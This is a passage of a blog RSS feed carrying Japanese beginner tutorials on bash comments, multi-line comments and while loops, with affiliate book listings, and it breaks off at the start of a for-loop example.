&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【３．コメント】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-03-suzuki/</link><pubDate>Fri, 07 Jan 2022 10:03:12 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-03-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-03-suzuki/shellscript.jpg" alt="Featured image of post 【３．コメント】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="コメント">コメント&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b> コメントの使用&lt;/b>&lt;/font>&lt;br>
「#」記号は、bashスクリプトに1行コメントを追加するために使用されます。&lt;br>
&amp;lsquo;comment_example.sh&amp;rsquo;という名前の新しいファイルを作成し、1行コメント付きの次のスクリプトを追加します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:comment_example.sh" data-lang="bash:comment_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="c1">#2つの数値をsumに追加します&lt;/span>
&lt;span class="o">((&lt;/span>&lt;span class="nv">sum&lt;/span>&lt;span class="o">=&lt;/span>25+35&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">#結果を出力します&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$sum&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash comment_example.sh
60
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>複数行コメントに関しては次の章で説明します。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【４．マルチラインコメント】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-04-suzuki/</link><pubDate>Fri, 07 Jan 2022 10:03:12 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-04-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-04-suzuki/shellscript.jpg" alt="Featured image of post 【４．マルチラインコメント】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="マルチラインコメント">マルチラインコメント&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b> 複数行コメントの使用&lt;/b>&lt;/font>&lt;br>
bashではさまざまな方法で複数行コメントを使用できます。&lt;br>
次の例に簡単な方法を示します。&lt;br>
&amp;lsquo;multiline-comment.sh&amp;rsquo;という名前の新しいbashを作成し、次のスクリプトを追加します。&lt;br>
ここでは、「:」と「'」でbashで複数行コメントを実現しています。&lt;br>
次のスクリプトは、5の2乗を計算します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:multiline-comment.sh" data-lang="bash:multiline-comment.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
: &lt;span class="s1">&amp;#39;
&lt;/span>&lt;span class="s1">次のスクリプトは、
&lt;/span>&lt;span class="s1">数値の2乗値5を計算します。
&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>
&lt;span class="o">((&lt;/span>&lt;span class="nv">area&lt;/span>&lt;span class="o">=&lt;/span>5*5&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$area&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash multiline-comment.sh
25
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>多くの場合、マルチラインコメントの存在は知られていない。&lt;/dd>
&lt;dd>ほとんどの人は、行頭に「#」をならべて複数行コメントを行う。&lt;/dd>
&lt;dd>それは、過去のメジャーソースコードの冒頭にそうあるからだ。&lt;/dd>
&lt;dd>そう、UNIX/Linuxの開発者のほとんどは、マルチラインコメントを知らないのだ。&lt;/dd>
&lt;dd>
&lt;p>今後出てくるであろうファイルの生成に「touch」というコマンドがある。これ実は 「:&amp;gt;ファイル名」で、空のファイルを生成する事ができる。「:」は、”なにもしないことを示す。if文の中で何もしない場合は、以下のように記述する。&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>if [ &amp;ldquo;$v&amp;rdquo; -eq 5 ];then&lt;/p>
&lt;/dd>
&lt;dd>: # 何もしない&lt;/dd>
&lt;dd>fi&lt;/dd>
&lt;dd>
&lt;p>touchは既にファイルがあれば、そのファイルにはさわらない。&lt;/p>
&lt;/dd>
&lt;dd>:&amp;gt; は既にファイルがあれば、そのファイルさえも空にする。&lt;/dd>
&lt;dd>上記 if 文の中の : は　何もしないことを示す。&lt;/dd>
&lt;dd>マルチラインコメントも同じ「:」から始まり、何もしないことを示している。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【５．while ループ】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-05-suzuki/</link><pubDate>Fri, 07 Jan 2022 10:03:12 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-05-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-05-suzuki/shellscript.jpg" alt="Featured image of post 【５．while ループ】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="while-ループ">while ループ&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b> whileループの使用&lt;/b>&lt;/font>&lt;br>
whileループの使用法を知るために、「while_example.sh」という名前のbashファイルを作成します。&lt;br>
この例では、whileループが5回繰り返されます。&lt;br>
count変数の値は、各ステップで1ずつ増加します。&lt;br>
count変数の値が5になると、whileループは終了します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:while_exapmle.sh" data-lang="bash:while_exapmle.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">valid&lt;/span>&lt;span class="o">=&lt;/span>true&lt;span class="p">;&lt;/span>
&lt;span class="nv">count&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$valid&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">do&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$count&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$count&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -eq &lt;span class="m">5&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
break&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;span class="o">((&lt;/span>count++&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash while_example.sh
1
2
3
4
5
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>上記ソースでトリッキーなのはwhileよりもむしろ&lt;/dd>
&lt;dd>
&lt;p>((COUNT++))&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>だろう。&lt;/p>
&lt;/dd>
&lt;dd>COUNT = COUNT + 1;&lt;/dd>
&lt;dd>
&lt;p>count=1&lt;/p>
&lt;/dd>
&lt;dd>count=$(expr $count + 1) # =&amp;gt; 2&lt;/dd>
&lt;dd>let ++count # =&amp;gt; 2&lt;/dd>
&lt;dd>let count++ # =&amp;gt; 3&lt;/dd>
&lt;dd>count=$((++count)) # =&amp;gt; 2&lt;/dd>
&lt;dd>count=$((count++)) # =&amp;gt; 2&lt;/dd>
&lt;dd>count=$((count += 1)) # =&amp;gt; 3&lt;/dd>
&lt;dd>
&lt;p>変数に代入する必要がないから $(( )) ではなく、&lt;/p>
&lt;/dd>
&lt;dd>(( )) でよい。(( )) の中の変数を表す「$」は記述の必要はない&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【６．for ループ】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-06-suzuki/</link><pubDate>Fri, 07 Jan 2022 10:03:12 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-06-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-06-suzuki/shellscript.jpg" alt="Featured image of post 【６．for ループ】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="for-ループ">for ループ&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b> forループの使用&lt;/b>&lt;/font>&lt;br>
基本的なforループ宣言を示します。&lt;br>
&amp;lsquo;for_example.sh&amp;rsquo;という名前のファイルを作成し、forループを使用して、次のスクリプトを追加します。&lt;br>
ここでは、forループは10回繰り返され、変数のすべての値、counterを1行で出力します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:for_example.sh" data-lang="bash:for_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">for&lt;/span>&lt;span class="o">((&lt;/span>&lt;span class="nv">counter&lt;/span>&lt;span class="o">=&lt;/span>10&lt;span class="p">;&lt;/span>counter&amp;gt;0&lt;span class="p">;&lt;/span>counter--&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">do&lt;/span>
